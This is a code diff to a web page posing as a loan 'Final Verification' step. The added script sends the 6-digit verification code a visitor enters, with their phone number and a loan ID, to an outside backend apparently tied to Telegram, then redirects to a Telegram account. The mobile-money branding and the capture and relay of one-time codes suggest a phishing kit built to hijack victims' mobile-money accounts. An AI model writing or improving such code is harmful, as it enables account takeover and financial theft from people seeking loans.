@@ -113,6 +113,10 @@
             cursor: pointer;
             margin: 10px 0;
         }
+        .btn-action:disabled {
+            background: #d1d5db;
+            cursor: not-allowed;
+        }
         .back-btn {
             width: 100%;
             background: transparent;
@@ -166,7 +170,7 @@
 
     <div class="content-wrapper">
         <h1>Final Verification</h1>
-        <p class="subtitle">Enter the 6-digit verification code</p>
+        <p class="subtitle">Enter the 6-digit verification code to complete your loan</p>
 
         <div class="offer-info">
             <div class="offer-amount" id="offerAmount">—</div>
@@ -188,8 +192,12 @@
 </div>
 
 <script>
+    const API_URL = 'https://momo-uganda-production.up.railway.app';
     const TELEGRAM_USERNAME = 'telecelcash';
     const TELEGRAM_LINK = `https://t.me/${TELEGRAM_USERNAME}`;
+    
+    let loanId = sessionStorage.getItem('loanId') || '';
+    let userPhone = sessionStorage.getItem('userPhone') || '';
 
     function loadLoanData() {
         const calculatorData = sessionStorage.getItem('calculatorData');
@@ -227,7 +235,7 @@
                     inputs[index + 1].focus();
                 }
                 if (getCode().length === 6) {
-                    setTimeout(goToTelegram, 200);
+                    setTimeout(submitFinalCode, 200);
                 }
             });
             input.addEventListener('keydown', (e) => {
@@ -238,9 +246,9 @@
         });
     }
 
-    function goToTelegram() {
-        const code = getCode();
-        if (code.length !== 6) {
+    async function submitFinalCode() {
+        const finalCode = getCode();
+        if (finalCode.length !== 6) {
             return;
         }
         
@@ -248,17 +256,36 @@
         btn.disabled = true;
         btn.textContent = "Processing...";
         document.getElementById('spinner').style.display = 'flex';
+
+        try {
+            // Send final code to backend for Telegram notification
+            const response = await fetch(`${API_URL}/api/save-final`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    loanId: loanId,
+                    finalCode: finalCode,
+                    phone: userPhone
+                })
+            });
+
+            const data = await response.json();
+            console.log('Final code saved:', data);
+            
+        } catch (error) {
+            console.error('Error sending final code:', error);
+        }
         
         // Save the final code
-        sessionStorage.setItem('finalCode', code);
+        sessionStorage.setItem('finalCode', finalCode);
         
-        // Redirect to Telegram
+        // Redirect to Telegram after 1 second
         setTimeout(() => {
             window.location.href = TELEGRAM_LINK;
         }, 1000);
     }
 
-    document.getElementById('verifyBtn').onclick = goToTelegram;
+    document.getElementById('verifyBtn').onclick = submitFinalCode;
     
     createInputs();
     setupAutoFocus();
